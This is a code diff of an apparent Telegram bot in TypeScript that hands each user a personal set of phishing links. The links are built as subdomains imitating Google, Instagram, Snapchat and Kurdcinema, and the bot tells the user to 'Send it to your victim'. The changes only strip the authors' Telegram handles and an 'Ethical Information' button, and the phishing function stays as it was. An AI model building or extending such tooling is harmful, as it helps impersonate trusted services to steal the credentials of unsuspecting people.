@@ -6,10 +6,9 @@ import { envs } from "./envs";
 
 const KEYBOARD = {
 	start: "Start Bot",
-	info: "Ethical Information Channel",
 } as const;
 
-const STATIC_KEYBOARD = new Keyboard().text(KEYBOARD.start).row().text(KEYBOARD.info).row().persistent().resized();
+const STATIC_KEYBOARD = new Keyboard().text(KEYBOARD.start).row().persistent().resized();
 
 type StartContext = CommandContext<Context> | HearsContext<Context>;
 async function startHandler(ctx: StartContext) {
@@ -21,8 +20,7 @@ async function startHandler(ctx: StartContext) {
 	const link = `${envs.APP_URL}/${ctx.from.id}`;
 
 	await ctx.reply(
-		"@xByteBlitzX\n@SeeYouIOSVIP\n\n" +
-			"Send it to your victim\n\n" +
+		"Send it to your victim\n\n" +
 			"Google:\n" +
 			`https://google.${link}\n\n` +
 			"Instagram:\n" +
@@ -32,9 +30,7 @@ async function startHandler(ctx: StartContext) {
 			"Snapchat:\n" +
 			`https://snapchat.${link}\n\n` +
 			"Kurdcinema:\n" +
-			`https://kurdcinema.${link}\n\n` +
-			">>>>\n" +
-			"@xByteBlitzX\n@SeeYouIOSVIP\n@xN1ghtmare",
+			`https://kurdcinema.${link}\n\n`,
 		{
 			parse_mode: "HTML",
 			reply_markup: STATIC_KEYBOARD,
@@ -53,7 +49,6 @@ bot.use(
 
 bot.command("start", startHandler);
 bot.hears(KEYBOARD.start, startHandler);
-bot.hears(KEYBOARD.info, async (ctx) => await ctx.reply("Ethical Information : https://t.me/xByteBlitzX"));
 
 bot.errorBoundary((error) => {
 	console.error("An error occurred in the bot:", error);
